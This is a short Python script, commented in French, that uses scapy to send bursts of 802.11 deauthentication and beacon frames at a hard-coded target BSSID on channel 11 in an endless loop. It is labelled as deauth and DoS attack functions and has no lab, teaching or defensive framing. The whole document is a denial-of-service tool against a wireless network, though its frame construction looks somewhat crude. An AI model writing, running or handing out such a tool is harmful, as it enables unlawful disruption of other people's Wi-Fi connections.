import os
import time
from scapy.all import *

# Configuration
INTERFACE_WIRELESS = "wlan1"  # Interface sans fil à utiliser
BSSID_CIBLE = "08:36:C9:98:11:A9"  # BSSID de la cible
CANAL_CIBLE = 11  # Canal de la cible

# Fonction pour effectuer une attaque deauth
def attaque_deauth(bssid, canal):
    os.system(f"iwconfig {INTERFACE_WIRELESS} channel {canal}")
    packet = Dot11(type=0, subtype=12, addr1=bssid, addr2=bssid, addr3=bssid)
    sendp(packet, iface=INTERFACE_WIRELESS, count=100, inter=0.1)

# Fonction pour effectuer une attaque dos
def attaque_dos(bssid, canal):
    os.system(f"iwconfig {INTERFACE_WIRELESS} channel {canal}")
    packet = Dot11(type=0, subtype=8, addr1=bssid, addr2=bssid, addr3=bssid)
    sendp(packet, iface=INTERFACE_WIRELESS, count=100, inter=0.1)

# Boucle principale
while True:
    attaque_deauth(BSSID_CIBLE, CANAL_CIBLE)
    time.sleep(10)
    attaque_dos(BSSID_CIBLE, CANAL_CIBLE)
    time.sleep(10)
